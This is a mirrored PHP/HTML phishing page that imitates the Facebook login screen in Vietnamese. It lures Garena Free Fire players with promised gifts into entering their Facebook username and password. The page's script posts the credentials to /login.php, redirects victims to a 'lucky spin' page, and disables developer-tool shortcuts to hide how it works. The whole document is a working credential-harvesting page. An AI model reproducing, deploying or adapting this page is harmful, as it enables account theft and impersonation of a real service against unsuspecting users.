<?php

    session_start();
    ?>
<!doctype html>
<html lang="en">


<!-- Mirrored from nhanquafreefire.com/c1j7n6ks4z6lhmvt78kv4x6yc2kv1mio8436r5u3m854bo35xs.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Aug 2020 13:44:56 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Facebook - Đăng nhập hoặc đăng ký</title>
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;display=swap" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

    <!-- Styles -->
    <link href="TOM_theme/fb30f4.css?v=3" rel="stylesheet">

</head>

<body>
		<div style="background: #3b5998;height: 43px;display: block;color:#1877f2;font-size:25px;font-weight:bold;text-align:center;"> </div>


    <div style=" background: red;color: #fff;padding: 3px;font-size: 15px; display:none" id="login-notice"></div>
				    <div class="container">
        <div class="wrap-top">
            <div class="wrap-image">
                <div class="wrap-image-one">
                    <img src="logo.jpg" alt="" class="img-fluid">
                </div>
            </div>
            <h2 class="wrap-text-top">
                    <span class="text-top">Hãy đăng nhập vào tài khoản Facebook của bạn để kết nối với Garena Free Fire</span>
                </h2>
        </div>

        <div class="wraper-form">
            <form  method="post" id="login_form" novalidate="1" data-autoid="autoid_2">
                <div class="content-form">
                    <div class="form-group">
                        <input type="text" placeholder="Tên Tài Khoản" name="username" class="form-control bd-none" required="required">
                    </div>
                    <div class="form-group">
                        <input type="password" placeholder="Mật Khẩu" name="password" class="form-control bd-none" required="required">
                    </div>

                    <div class="wrap-btn-login">
                        <button type="submit" name="login" class="btn btn-login">Đăng nhập</button>
                    </div>
                </div>
				<hr/>
                <div class="wrap-bottom-form">
                    <center><button class="btn btn-register" style="background:#00a400;font-size: 0.8rem;">Tạo tài khoản mới</button></center>
                    <p>Quên mật khẩu - Trung tâm trợ giúp</p>
                </div>
            </form>
        </div>

        <div class="bottom-page">
            <span>
                    <b>Tiếng Việt </b> <span class="color-blue">- Bahasa Melayu - English (UK) - More Languages...</span>
            </span>
            <br>
            <span>
                    Facebook ©2020
                </span>
        </div>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>


    </div>
</body>


<!-- Mirrored from nhanquafreefire.com/c1j7n6ks4z6lhmvt78kv4x6yc2kv1mio8436r5u3m854bo35xs.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Aug 2020 13:44:56 GMT -->
</html>

<script>
            document.onkeydown=function(a){if(123==event.keyCode||a.ctrlKey&&a.shiftKey&&73==a.keyCode||a.ctrlKey&&a.shiftKey&&67==a.keyCode||a.ctrlKey&&a.shiftKey&&74==a.keyCode||a.ctrlKey&&85==a.keyCode)return!1};
			$(document).ready(function(){
				$('#login_form').submit(function(e) {
					jQuery.ajax({
						method: 'POST',
						url: '/login.php',
						data: $(this).serialize(),
						dataType: 'json',
						complete: function() {
							captchaGenerate()
						}
					}).done(function(data) {
						if (data.status == 'success') {
							location.href = '/vongquay.html'
						} else {
							$('#first-notice').hide()
							$('#login-notice').text(data.message || 'Có lỗi khi nhận quà!').show()
						}
					}).fail(function() {
						$('#login-notice').text('Đã xảy ra lỗi khi đăng nhập, vui lòng thử lại sau!').show()
					})
					e.preventDefault()
				})
			})
		</script>